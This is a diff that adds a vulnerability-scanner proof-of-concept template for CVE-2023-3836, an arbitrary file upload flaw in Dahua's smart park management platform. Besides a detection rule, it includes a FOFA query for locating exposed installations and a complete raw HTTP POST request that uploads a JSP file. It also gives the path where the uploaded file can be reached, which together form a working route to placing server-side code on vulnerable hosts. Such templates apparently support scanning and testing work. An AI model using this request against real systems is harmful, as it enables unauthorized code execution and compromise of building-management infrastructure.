@@ -1,0 +1,35 @@
+name: poc-yaml-CVE-2023-3836-file-upload
+rules:
+  - method: GET
+    path: /emap/devicePoint_addImgIco?hasSubsystem=true
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b"\"code\":1")
+detail:
+  author: test
+  info: |
+    fof检索： app="dahua-智慧园区综合管理平台" fofa："/WPMS/asset/lib/gridster/"
+    CVE-2023-3836: 大华智慧园区综合管理平台任意文件上传漏洞
+    POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
+    Host: 127.0.0.1:8089
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: JSESSIONID=E7B81FC2CC733D7171300B5DEB258D03
+    Connection: close
+    Content-Type: multipart/form-data; boundary=f3aeb22be281d77542546a2f71e20982
+    Content-Length: 221
+
+    --f3aeb22be281d77542546a2f71e20982
+    Content-Disposition: form-data; name="upload"; filename="a.jsp"
+    Content-Type: application/octet-stream
+    Content-Transfer-Encoding: binary
+
+    123
+    --f3aeb22be281d77542546a2f71e20982--
+
+    上传成功后访问: http://127.0.0.1:8089/upload/emap/society_new/ico_res_bfe1b8676663_on.jsp
+  links:
+    - https://blog.csdn.net/weixin_48539059/article/details/132736170
